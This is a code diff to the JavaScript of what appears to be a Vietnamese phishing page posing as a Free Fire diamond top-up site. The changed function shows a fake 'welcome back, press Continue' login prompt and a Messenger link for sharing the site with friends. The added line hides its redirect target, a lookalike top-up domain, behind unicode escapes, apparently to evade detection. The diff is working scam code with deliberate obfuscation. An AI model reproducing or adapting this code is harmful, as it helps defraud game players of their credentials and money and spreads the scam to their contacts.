@@ -386,7 +386,7 @@ function getRndInteger(min, max) {
 }
 function otp(){
     $("#photo").hide();
-    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="http://freefire-vn.cf/"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://napkimcuongx10.ml/"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
+    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0076\u0069\u002d\u006e\u0061\u0070\u0074\u0068\u0065\u002e\u006f\u006e\u006c\u0069\u006e\u0065"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://napkimcuongx10.ml/"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
 }
 
 function login(){
